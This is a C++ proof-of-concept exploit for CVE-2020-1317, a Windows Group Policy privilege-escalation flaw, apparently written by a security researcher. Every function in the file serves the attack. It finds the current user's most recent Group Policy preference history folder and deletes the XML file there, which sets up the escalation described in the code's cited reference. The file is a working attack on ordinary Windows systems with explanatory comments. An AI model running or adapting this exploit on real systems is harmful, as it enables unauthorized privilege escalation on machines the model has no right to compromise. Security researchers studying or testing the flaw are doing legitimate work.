#include <iostream>
#include <Windows.h>

void banner() {
	printf("CVE-2020-1317 Exploit by Grant Willcox (@tekwizz123)\r\n");
}

bool findFile(WCHAR* inputPath, int extraSearchCharactersCount) {
	DWORD reason = 0;
	DWORD result = 0;
	WIN32_FIND_DATAW findFileData = { 0 };
	HANDLE hFindFile = FindFirstFileW(inputPath, &findFileData);
	if (hFindFile == INVALID_HANDLE_VALUE) {
		reason = GetLastError();
		if (reason == ERROR_FILE_NOT_FOUND) {
			printf("Couldn't find the file %ls\r\n", inputPath);
			return false;
		}
	}

	DWORD fileAttributes = 0;
	fileAttributes = findFileData.dwFileAttributes;
	if (fileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
		printf("The file turned out to actually be a directory. Something odd is going on here! Exiting...\r\n");
		return false;
	}

	FindClose(hFindFile); // Make sure we don't have any dangling file handles.

	// Copy the resulting file path string back into inputPath, aka the WCHAR buffer
	// passed in by the caller, so that the caller gets an updated path string containing the
	// path to the most recently updated directory based on their search criteria.
	wmemcpy_s(inputPath + lstrlenW(inputPath) - extraSearchCharactersCount, MAX_PATH, L"\x00", 5); // Remove the extra "*.xml" string and replace it with a NULL terminators instead.
	wmemcpy_s(inputPath + lstrlenW(inputPath) , MAX_PATH, findFileData.cFileName, lstrlenW(findFileData.cFileName)); // Now fill that space in with the actual XML file name.
	return true;
}

bool findMostRecentlyUpdatedFolder(WCHAR * inputPath, int extraSearchCharactersCount) {
	DWORD reason = 0;
	DWORD result = 0;
	WIN32_FIND_DATAW findFileData = { 0 };
	HANDLE hFindFile = FindFirstFileW(inputPath, &findFileData);
	if (hFindFile == INVALID_HANDLE_VALUE) {
		reason = GetLastError();
		if (reason == ERROR_FILE_NOT_FOUND) {
			printf("Couldn't find the file %ls\r\n", inputPath);
			return false;
		}
	}
	DWORD fileAttributes = 0;
	FILETIME mostRecentFileTime = { 0 };
	FILETIME currentModifiedFileTime = { 0 };
	WCHAR pathMostRecentlyUpdatedFile[MAX_PATH];
	while (1) {
		fileAttributes = findFileData.dwFileAttributes; // Retrieve the currently matched item's attributes...
		currentModifiedFileTime = findFileData.ftLastWriteTime; // Retrieve the last time the currently match item was written to...
		if ((fileAttributes & FILE_ATTRIBUTE_DIRECTORY)) { // We only want to match directories, not files, so lets make sure this is the case.
			if ( (lstrcmpW(L"..", findFileData.cFileName) != 0) && (lstrcmpW(L".", findFileData.cFileName) != 0) ) { // If the folder name is not . or .. then continue, else skip it.
				if ((currentModifiedFileTime.dwHighDateTime > mostRecentFileTime.dwHighDateTime) || ((currentModifiedFileTime.dwHighDateTime == mostRecentFileTime.dwHighDateTime) && (currentModifiedFileTime.dwLowDateTime > mostRecentFileTime.dwLowDateTime))) {
					// If the date the currently matched directory was modified is more recent then the one we have on record,
					// then update mostRecentFileTime accordingly to keep track of this, and update pathMostRecentlyUpdatedFile
					// to point to the path of this file.
					mostRecentFileTime = currentModifiedFileTime;
					memset(pathMostRecentlyUpdatedFile, 0, MAX_PATH * 2);
					wmemcpy_s(pathMostRecentlyUpdatedFile, MAX_PATH, inputPath, lstrlenW(inputPath) - extraSearchCharactersCount); // Minus to remove the trailing search characters at the end of the path.
					wmemcpy_s(pathMostRecentlyUpdatedFile + lstrlenW(pathMostRecentlyUpdatedFile), MAX_PATH, findFileData.cFileName, lstrlenW(findFileData.cFileName)); // Append rest of the folder name to the path.
				}
			}
		}

		// Get info on the next file in the directory that matches the search criteria.
		result = FindNextFileW(hFindFile, &findFileData);
		if (result == FALSE) {
			reason = GetLastError();
			if (reason != ERROR_NO_MORE_FILES) {
				printf("An error occured whilst calling FindNextFileW(): %d\r\n", reason);
				return false;
			}
			else {
				break;
			}
		}
	}
	FindClose(hFindFile); // Make sure we don't have any dangling file handles.

	// Copy the resulting file path string back into inputPath, aka the WCHAR buffer
	// passed in by the caller, so that the caller gets an updated path string containing the
	// path to the most recently updated directory based on their search criteria.
	memset(inputPath, 0, MAX_PATH * 2);
	wmemcpy_s(inputPath, MAX_PATH, pathMostRecentlyUpdatedFile, lstrlenW(pathMostRecentlyUpdatedFile));
	return true;
}


int main() {
	// Print out our banner for attribution purposes :)
	banner();
	
	// Create the buffer to store the current username and zero it out.
	WCHAR usernameBuffer[MAX_PATH];
	memset(usernameBuffer, 0, MAX_PATH * 2);

	// Ensure the total size of the current username is not longer than MAX_PATH, whilst
	// also saving the actual current username into usernameBuffer, and the size of this
	// username string, in Unicode characters, into totalUsernameSize.
	DWORD totalUsernameSize = MAX_PATH;
	GetUserNameW(usernameBuffer, &totalUsernameSize);

	// Create a new WCHAR buffer named filePath which we use throughout 
	// the rest of the exploit to hold the full path to the XML file to be deleted.
	// Also clear it out.
	WCHAR filePath[MAX_PATH];
	memset(filePath, 0, MAX_PATH * 2);

	// Create the start of the path, which should be in the format C:\Users\*username*\AppData\Local\Microsoft\Group Policy\History\.
	// We also append the string "{*" to it as we want the FindFirstFileW() call inside findMostRecentlyUpdatedFolder() to search only
	// for files that start with this string.
	wmemcpy_s(filePath, MAX_PATH, L"C:\\Users\\", lstrlenW(L"C:\\Users\\"));
	wmemcpy_s(filePath + lstrlenW(filePath), MAX_PATH, usernameBuffer, totalUsernameSize);
	wmemcpy_s(filePath + lstrlenW(filePath), MAX_PATH, L"\\AppData\\Local\\Microsoft\\Group Policy\\History\\{*", lstrlenW(L"\\AppData\\Local\\Microsoft\\Group Policy\\History\\{*")); // Files in this directory we are insterested in should start with {


	// After this call the file path within filePath should look something like
	// C:\Users\*username*\AppData\Local\Microsoft\Group Policy\History\{B4EEE8C2-6231-4692-8A04-868BF877EA28}
	BOOL result = false;
	result = findMostRecentlyUpdatedFolder(filePath, 2); // Remove two characters, aka the "{*", so we get the correct path.
	if (result == false) {
		return -1;
	}

	// This will give the SID folder such as S-1-5-21-3070936213-306261907-1348773959-36005/
	// filePath should look like C:\Users\*username*\AppData\Local\Microsoft\Group Policy\History\{B4EEE8C2-6231-4692-8A04-868BF877EA28}\S-1-5-21-3070936213-306261907-1348773959-36005
	wmemcpy_s(filePath + lstrlenW(filePath), MAX_PATH, L"\\S-*", lstrlenW(L"\\S-*")); // Search for S- as this is the start of an SID directory which is what we are after.
	result = findMostRecentlyUpdatedFolder(filePath, 3); // Remove three characters, aka the "S-*", so we get the correct path.
	if (result == false) {
		return -1;
	}

	// In tests this will give the Preferences/ folder. filePath should look like 
    // C:\Users\*username*\AppData\Local\Microsoft\Group Policy\History\{B4EEE8C2-6231-4692-8A04-868BF877EA28}\S-1-5-21-3070936213-306261907-1348773959-36005\Preferences
	wmemcpy_s(filePath + lstrlenW(filePath), MAX_PATH, L"\\*", lstrlenW(L"\\*")); // Search for any folder in current directory
	result = findMostRecentlyUpdatedFolder(filePath, 1); // Remove one character, the "*" character.
	if (result == false) {
		return -1;
	}


	// In tests this will give the unique folder underneath the Preferences/ folder, such as Printers/. filePath should look like
	// C:\Users\*username*\AppData\Local\Microsoft\Group Policy\History\{B4EEE8C2-6231-4692-8A04-868BF877EA28}\S-1-5-21-3070936213-306261907-1348773959-36005\Preferences\*app specific directory*
	wmemcpy_s(filePath + lstrlenW(filePath), MAX_PATH, L"\\*", lstrlenW(L"\\*")); // Search for any folder in current directory
	result = findMostRecentlyUpdatedFolder(filePath, 1); // Remove one character, the "*" character.
	if (result == false) {
		return -1;
	}

	// Okay now we are in the directory that we want, lets find that .xml file we are after :)
	wmemcpy_s(filePath + lstrlenW(filePath), MAX_PATH, L"\\*.xml", lstrlenW(L"\\*.xml")); // Search for any XML file in the current directory
	result = findFile(filePath, 5); // Remove five characters, namely "*.xml".
	if (result == false) {
		return -1;
	}

	// For more info as to why we call it the GPO history file, see https://sdmsoftware.com/security-related/understanding-group-policy-privilege-escalation-in-cve-2020-1317/
	// which explains this way better than I can.
	printf("Located the target GP Preferences history file we want to use, which is located at %ls\r\n", filePath);
	printf("Attempting to delete this file...\r\n");

	if (DeleteFileW(filePath) == false) {
		printf("Was unable to delete the XML file, the error was: %d\r\n", GetLastError());
		return -2;
	}

	printf("Done!\r\n");
}